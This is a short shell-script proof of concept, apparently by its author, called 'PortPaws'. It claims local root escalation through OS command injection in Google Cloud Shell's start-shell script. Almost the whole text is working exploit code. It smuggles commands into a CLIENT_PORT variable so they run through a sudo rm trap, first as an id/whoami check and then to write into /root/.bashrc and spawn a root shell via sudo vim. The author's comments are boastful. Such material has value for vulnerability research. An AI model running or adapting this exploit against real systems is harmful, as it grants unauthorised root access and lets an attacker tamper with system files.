# PortPaws - Local Privilege Escalation via OS Command Injection (CMi - CWE 78)

# Echo the path 
echo "/google/devshell/start-shell.sh"

# Set the 'trap', LMAO
(                                                                                                                                            
  DEVSHELL_CLIENTS_DIR="/tmp"
  CLIENT_PORT="8080; id; whoami"
  trap "sudo rm -f ${DEVSHELL_CLIENTS_DIR}/${CLIENT_PORT}" EXIT
  exit
)

# Spring it - get a (root) shell
(
  DEVSHELL_CLIENTS_DIR="/tmp"
  CLIENT_PORT="8080; echo 'export PS1=\"Zoey@hacker: # \"' | sudo tee -a /root/.bashrc; sudo vim -c ':sh' -c ':q'"
  trap "sudo rm -f ${DEVSHELL_CLIENTS_DIR}/${CLIENT_PORT}" EXIT
  exit
)

# Written on a 2020 MacBook Air - Silver.
# I echo the path, because I'm tired of trying to find vulnerable paths for old bugs after months, LOL.
# I found the bug yesterday, and fixed/wrote the script today.

